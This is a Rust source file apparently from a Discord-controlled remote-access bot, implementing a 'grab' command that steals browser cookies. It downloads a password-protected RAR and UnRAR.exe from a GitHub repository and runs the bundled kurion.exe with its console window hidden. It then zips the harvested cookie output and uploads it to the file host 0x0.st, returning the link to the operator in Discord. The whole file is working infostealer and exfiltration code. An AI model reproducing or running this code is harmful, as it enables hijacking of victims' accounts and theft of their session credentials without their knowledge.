use crate::prelude::*;
use std::env;
use std::fs;
use std::io::{Cursor, Read, Write};
use std::path::{Path, PathBuf};
use std::time::Duration;
use walkdir::WalkDir;
use zip::ZipWriter;

const MODULE_NAME: &str = "kurion.exe";
const DOWNLOAD_URL: &str = "https://github.com/Mikasuru/Arc/raw/refs/heads/main/Assets/Scripts/kurion.rar";
const UNRAR_URL: &str = "https://github.com/Mikasuru/Arc/raw/refs/heads/main/Assets/Scripts/UnRAR.exe";
const RAR_PASSWORD: &str = "kurion67";

fn get_unrar_dir() -> PathBuf {
    let local_low = env::var("LOCALAPPDATA")
        .map(|p| PathBuf::from(p).parent().unwrap_or(&PathBuf::from("C:\\Users")).join("LocalLow"))
        .unwrap_or_else(|_| PathBuf::from("C:\\Users\\Public\\LocalLow"));
    local_low.join("UnRAR")
}

fn get_unrar_path() -> PathBuf {
    get_unrar_dir().join("UnRAR.exe")
}

#[poise::command(prefix_command, aliases("grabcookies", "cookies"))]
pub async fn grab(
    ctx: PoiseContext<'_>,
    #[description = "Format: json or netscape"]
    #[rest]
    format_arg: Option<String>,
) -> Result<(), Error> {
    let format = match format_arg.as_deref().unwrap_or("netscape").to_lowercase().as_str() {
        "json" => "json",
        _ => "netscape",
    };

    let reply = ctx.say(format!("Initializing... (Format: {})", format.to_uppercase())).await?;

    let unrar_path = get_unrar_path();
    if !unrar_path.exists() {
        reply.edit(ctx, poise::CreateReply::default().content("Downloading UnRAR...")).await?;
        if let Err(e) = download_unrar().await {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("Failed to download UnRAR: {}", e))).await?;
            return Ok(());
        }
    }

    reply.edit(ctx, poise::CreateReply::default().content("Downloading module...")).await?;

    let module_dir = get_module_path()?;
    cleanup(&module_dir)?;
    fs::create_dir_all(&module_dir)?;

    let rar_path = match download_rar(&module_dir).await {
        Ok(path) => path,
        Err(e) => {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("Download failed: {}", e))).await?;
            cleanup(&module_dir)?;
            return Ok(());
        }
    };

    reply.edit(ctx, poise::CreateReply::default().content("Extracting archive...")).await?;
    
    let rar_path_clone = rar_path.clone();
    let module_dir_clone = module_dir.clone();
    let unrar_path_clone = unrar_path.clone();
    
    let extract_result = tokio::task::spawn_blocking(move || {
        extract_with_unrar(&unrar_path_clone, &rar_path_clone, &module_dir_clone)
    }).await;

    match extract_result {
        Ok(Ok(_)) => {}
        Ok(Err(e)) => {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("Extraction failed: {}", e))).await?;
            cleanup(&module_dir)?;
            return Ok(());
        }
        Err(e) => {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("Extraction error: {}", e))).await?;
            cleanup(&module_dir)?;
            return Ok(());
        }
    }

    let _ = fs::remove_file(&rar_path);

    reply.edit(ctx, poise::CreateReply::default()
        .content(format!("Running grabber ({})...", format.to_uppercase()))).await?;

    if let Err(e) = run_kurion(&module_dir, format) {
        reply.edit(ctx, poise::CreateReply::default()
            .content(format!("Execution failed: {}", e))).await?;
        cleanup(&module_dir)?;
        return Ok(());
    }

    tokio::time::sleep(Duration::from_secs(2)).await;

    let output_dir = module_dir.join("output");
    let actual_output_dir = if output_dir.exists() {
        output_dir
    } else {
        let mut found = None;
        if let Ok(entries) = fs::read_dir(&module_dir) {
            for entry in entries.flatten() {
                if entry.path().is_dir() {
                    let name = entry.file_name().to_string_lossy().to_lowercase();
                    if name.contains("output") || name.contains("result") {
                        found = Some(entry.path());
                        break;
                    }
                }
            }
        }
        match found {
            Some(dir) => dir,
            None => {
                reply.edit(ctx, poise::CreateReply::default()
                    .content("No output folder found after execution")).await?;
                cleanup(&module_dir)?;
                return Ok(());
            }
        }
    };

    reply.edit(ctx, poise::CreateReply::default().content("Compressing results...")).await?;
    let zip_data = match zip_output(&actual_output_dir) {
        Ok(data) => data,
        Err(e) => {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("Failed to compress: {}", e))).await?;
            cleanup(&module_dir)?;
            return Ok(());
        }
    };

    if zip_data.is_empty() {
        reply.edit(ctx, poise::CreateReply::default()
            .content("No data to upload (empty output)")).await?;
        cleanup(&module_dir)?;
        return Ok(());
    }

    reply.edit(ctx, poise::CreateReply::default().content("Uploading to nullpoint...")).await?;
    
    let timestamp = chrono::Local::now().format("%Y%m%d_%H%M%S");
    let filename = format!("cookies_{}_{}.zip", format, timestamp);
    let file_size = zip_data.len();

    match crate::utils::nullpointer::upload_bytes(&zip_data, &filename).await {
        Ok(result) => {
            let embed = serenity::CreateEmbed::new()
                .title("Cookies Grabbed")
                .field("Format", format.to_uppercase(), true)
                .field("Size", format!("{:.2} KB", file_size as f64 / 1024.0), true)
                .field("Download", &result.url, false)
                .footer(serenity::CreateEmbedFooter::new("Hosted on 0x0.st"))
                .color(0x2ecc71);

            reply.edit(ctx, poise::CreateReply::default()
                .content("")
                .embed(embed)).await?;
        }
        Err(e) => {
            reply.edit(ctx, poise::CreateReply::default()
                .content(format!("Upload failed: {}", e))).await?;
        }
    }

    cleanup(&module_dir)?;
    Ok(())
}

fn get_module_path() -> Result<PathBuf, anyhow::Error> {
    let temp_dir = env::temp_dir();
    Ok(temp_dir.join("kurion_temp"))
}

fn cleanup(module_dir: &Path) -> Result<(), anyhow::Error> {
    if module_dir.exists() {
        for _ in 0..3 {
            if fs::remove_dir_all(module_dir).is_ok() {
                break;
            }
            std::thread::sleep(Duration::from_millis(500));
        }
    }
    Ok(())
}

async fn download_unrar() -> Result<(), anyhow::Error> {
    let unrar_dir = get_unrar_dir();
    if !unrar_dir.exists() {
        fs::create_dir_all(&unrar_dir)?;
    }

    let unrar_path = get_unrar_path();
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .timeout(Duration::from_secs(120))
        .build()?;

    let response = client.get(UNRAR_URL).send().await?;

    if !response.status().is_success() {
        return Err(anyhow::anyhow!("Download failed with status: {}", response.status()));
    }

    let bytes = response.bytes().await?;
    let mut file = fs::File::create(&unrar_path)?;
    file.write_all(&bytes)?;

    Ok(())
}

async fn download_rar(module_dir: &Path) -> Result<PathBuf, anyhow::Error> {
    if !module_dir.exists() {
        fs::create_dir_all(module_dir)?;
    }

    let rar_path = module_dir.join("kurion.rar");
    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        .timeout(Duration::from_secs(120))
        .build()?;

    let response = client.get(DOWNLOAD_URL).send().await?;

    if !response.status().is_success() {
        return Err(anyhow::anyhow!("Download failed with status: {}", response.status()));
    }

    let bytes = response.bytes().await?;
    let mut file = fs::File::create(&rar_path)?;
    file.write_all(&bytes)?;

    Ok(rar_path)
}

fn extract_with_unrar(unrar_path: &Path, rar_path: &Path, output_dir: &Path) -> Result<(), anyhow::Error> {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    const CREATE_NO_WINDOW: u32 = 0x08000000;

    if !output_dir.exists() {
        fs::create_dir_all(output_dir)?;
    }

    let dest_str = format!("{}\\", output_dir.display());

    let output = Command::new(unrar_path)
        .arg("x")
        .arg("-y")
        .arg("-o+")
        .arg(format!("-p{}", RAR_PASSWORD))
        .arg("-idq")
        .arg(rar_path)
        .arg(&dest_str)
        .creation_flags(CREATE_NO_WINDOW)
        .output()?;

    if output.status.success() {
        return Ok(());
    }

    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);

    if stderr.contains("password") || stdout.contains("password") {
        return Err(anyhow::anyhow!("Wrong password for RAR archive"));
    }

    Err(anyhow::anyhow!("UnRAR failed: {}", stderr))
}

fn run_kurion(module_dir: &Path, format: &str) -> Result<(), anyhow::Error> {
    use std::os::windows::process::CommandExt;
    use std::process::Command;

    let exe_path = module_dir.join(MODULE_NAME);

    if !exe_path.exists() {
        return Err(anyhow::anyhow!("kurion.exe not found after extraction"));
    }

    let format_arg = match format {
        "json" => "--json",
        "netscape" => "--netscape",
        _ => "--netscape",
    };

    let mut child = Command::new(&exe_path)
        .arg("all")
        .arg(format_arg)
        .current_dir(module_dir)
        .creation_flags(0x08000000)
        .spawn()?;

    let _ = child.wait();
    Ok(())
}

fn zip_output(output_dir: &Path) -> Result<Vec<u8>, anyhow::Error> {
    let mut buffer = Cursor::new(Vec::new());

    {
        let mut zip = ZipWriter::new(&mut buffer);
        let options = zip::write::FileOptions::default()
            .compression_method(zip::CompressionMethod::Deflated);

        for entry in WalkDir::new(output_dir).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path();

            if path.is_file() {
                let relative_path = path.strip_prefix(output_dir)?;
                let zip_path = relative_path.to_string_lossy().replace('\\', "/");

                zip.start_file(&zip_path, options)?;

                let mut file = fs::File::open(path)?;
                let mut contents = Vec::new();
                file.read_to_end(&mut contents)?;
                zip.write_all(&contents)?;
            }
        }
        zip.finish()?;
    }

    Ok(buffer.into_inner())
}
